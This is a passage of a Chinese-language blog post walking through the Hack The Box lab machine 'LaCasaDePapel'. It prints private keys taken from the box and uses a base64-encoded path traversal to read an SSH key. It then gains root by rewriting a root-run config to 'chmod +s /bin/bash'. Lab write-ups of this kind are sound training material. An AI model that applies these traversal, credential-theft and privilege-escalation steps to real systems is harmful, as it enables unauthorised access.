+   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
+   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
+   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
+   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
+   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
+   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
+   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
+   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
+   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
+   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
+   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
+   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
+   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n                                                                                                                                              
+   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
+   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
+   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
+   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
+   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
+   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
+   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
+   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
+   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
+   53udBEzjt3WPqYGkkDknVhjD\n
+   -----END PRIVATE KEY-----\n
+   &quot;&quot;&quot;
+</code></pre>
+<p>我们在 nairobi 用户下发现了一个 ca.key 文件，里面有一段证书？还是密钥？说不好</p>
+<pre><code class="bash">   -----BEGIN PRIVATE KEY-----\n
+   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
+   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
+   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
+   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\n
+   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n
+   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n
+   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n
+   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n
+   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n
+   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n
+   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n
+   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n
+   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n
+   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n
+   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n
+   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n                                                                                                                                              
+   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n
+   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n
+   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n
+   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n
+   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n
+   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n
+   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n
+   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n
+   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n
+   53udBEzjt3WPqYGkkDknVhjD\n
+   -----END PRIVATE KEY-----\n
+</code></pre>
+<p>这样直接保存下来，格式真是相当的乱啊，稍微替换整理一下</p>
+<p>在 vim 中使用 <code>:%s/\\n//g/ </code> 和 <code>:%s/ //g</code>就行替换</p>
+<p>得到了干净密钥</p>
+<pre><code class="bash">-----BEGINPRIVATEKEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
+7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
+2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
+uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
+YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
+s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
+PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
+Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
+1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
+/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
+q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
+uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
+I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
+7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
+G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
+sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
+CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
+sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
+ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
+zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
+ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
+9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
+WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
+7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
+aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
+53udBEzjt3WPqYGkkDknVhjD
+-----ENDPRIVATEKEY-----
+</code></pre>
+<p>但是空格被我们删除完了，所以我们还需要修改一下</p>
+<pre><code class="bash">-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
+7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
+2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
+uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
+YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
+s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
+PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
+Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
+1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
+/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
+q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
+uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
+I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
+7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
+G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
+sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
+CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
+sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
+ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
+zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
+ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
+9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
+WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
+7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
+aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
+53udBEzjt3WPqYGkkDknVhjD
+-----END PRIVATE KEY-----
+</code></pre>
+<p>ok，这样才是一个完整正确的密钥</p>
+<p>然后我们去生成一个证书</p>
+<pre><code class="bash">openssl req -new -key ca.key -out server.csr
+openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt
+openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12
+</code></pre>
+<p>内容可以随便填</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# openssl req -new -key ca.key -out server.csr
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter &#39;.&#39;, the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+
+Please enter the following &#39;extra&#39; attributes
+to be sent with your certificate request
+A challenge password []:
+An optional company name []:
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~/Desktop]
+└─# openssl x509 -req -days 365 -in server.csr -signkey ca.key -out server.crt
+Certificate request self-signature ok
+subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
+                                                                                                                                                                                                                   
+┌──(root㉿kali)-[~/Desktop]
+└─# openssl pkcs12 -export -in server.crt -inkey ca.key -out server.p12
+Enter Export Password:
+Verifying - Enter Export Password:
+</code></pre>
+<p>ok，这样我们就生成了我们需要的证书</p>
+<p>然后我们去浏览器导入我们的 p12 证书</p>
+<img src="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/-wiD2gbXNCqNo5iOANVEAC7T-WwPSyqe_HJ9W92wN-s.png" class>
+
+<p>ok，成功导入后我们就可以访问了</p>
+<img src="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/KP-SZZ5BnZYYzlnFOVL0hgRE8Pi_qKsyRgEkiu6cx98.png" class>
+
+<img src="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/9bXUELyCTkRNy_J_pavKmQaR-GOD8F69YOFbTzydsb4.png" class>
+
+<p>鼠标放上去就可以看到左下角出现了 <a href="https://10.10.10.131/?path=SEASON-1" target="_blank" rel="noopener">https://10.10.10.131/?path=SEASON-1</a></p>
+<p>这很明显有 lfi 了吧</p>
+<img src="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/Uxh-rQNITspoWqH8zp8-w1NMNr78MzJkzdbpjAj-V90.png" class>
+
+<p>成功包含到目录，我们去尝试一下获取 ssh 的密钥</p>
+<img src="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/wO2r5A4NLWq8DLWv26i9xJCKMxhCyssLKFU5lO4p-pw.png" class>
+
+<p>但是直接获取会出错，我们去看一下他的文件格式是怎样的</p>
+<img src="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/sDjgugciDRq_WY4nsyjF039vEQkzhdzmL3Oj92ig1j0.png" class>
+
+<p>似乎是转换为 base64 的</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# echo U0VBU09OLTEvMDEuYXZp|base64 -d             
+SEASON-1/01.avi
+</code></pre>
+<p>是的，是 base64，那我们也把需要读取的文件名转换为 base64 就好了</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# echo -n ../.ssh/id_rsa|base64
+Li4vLnNzaC9pZF9yc2E=
+</code></pre>
+<p>然后再去读取</p>
+<pre><code class="bash">https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E=
+</code></pre>
+<pre><code class="bash">-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>成功获取到了密钥</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ssh berlin@10.10.10.131 -i id_rsa
+berlin@10.10.10.131&#39;s password: 
+</code></pre>
+<p>但是这里使用 berlin 账户登录却不行</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ssh professor@10.10.10.131 -i id_rsa
+
+ _             ____                  ____         ____                  _ 
+| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
+| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | &#39;_ \ / _ \ |
+| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
+|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
+                                                            |_|       
+
+lacasadepapel [~]$ whoami&amp;&amp;id
+professor
+uid=1002(professor) gid=1002(professor) groups=1002(professor)
+</code></pre>
+<p>最后使用 professor 用户倒是成功进去了</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><pre><code class="bash">lacasadepapel [~]$ ls -la
+total 24
+drwxr-sr-x 4 professor professor 4096 Mar  6  2019 .
+drwxr-xr-x 7 root      root      4096 Feb 16  2019 ..
+lrwxrwxrwx 1 root      professor    9 Nov  6  2018 .ash_history -&gt; /dev/null
+drwx------ 2 professor professor 4096 Jan 31  2019 .ssh
+-rw-r--r-- 1 root      root        88 Jan 29  2019 memcached.ini
+-rw-r----- 1 root      nobody     434 Jan 29  2019 memcached.js
+drwxr-sr-x 9 root      professor 4096 Oct  3 13:13 node_modules
+</code></pre>
+<p>这边看到有一个 memcached.ini 的文件，是属于 root 的，但是在我们的目录，那和肯定是有关的，恰巧我们有读取权限，去看一下内容</p>
+<pre><code class="bash">lacasadepapel [~]$ cat memcached.ini 
+[program:memcached]
+command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
+</code></pre>
+<p>会使用 sudo 权限调用 nobody 用户使用 node 执行 memcached.js 文件？这套娃有点厉害</p>
+<p>但是我们没有编辑权限，那么怎么办呢？直接给它删掉自己创建一个吧</p>
+<pre><code class="bash">[program:memcached]
+command = chmod +s /bin/bash
+</code></pre>
+<pre><code class="bash">lacasadepapel [~]$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 715008 May  1  2018 /bin/bash
+lacasadepapel [~]$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 715008 May  1  2018 /bin/bash
+</code></pre>
+<p>稍等一会儿后，我们要的效果来了，提权去</p>
+<pre><code class="bash">lacasadepapel [~]$ /bin/bash -p
+lacasadepapel [~]$ whoami&amp;&amp;id
+root
+uid=1002(professor) gid=1002(professor) euid=0(root) egid=0(root) groups=0(root),1002(professor)
+</code></pre>
+<p>成功提权到 root 权限</p>
+<pre><code class="bash">lacasadepapel [~]$ cat /home/berlin/user.txt 
+f61519de2e8afee5a22f8de3a88a0e6b
+lacasadepapel [~]$ cat /root/root.txt 
+113f5e20d75aca2331511cdbe6319613
+</code></pre>
+<p>成功拿到 user 权限和 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/&title=《LaCasaDePapel - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/&title=《LaCasaDePapel - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《LaCasaDePapel - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/05/24/Hackthebox/Easy/Hackthebox-ScriptKiddie/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
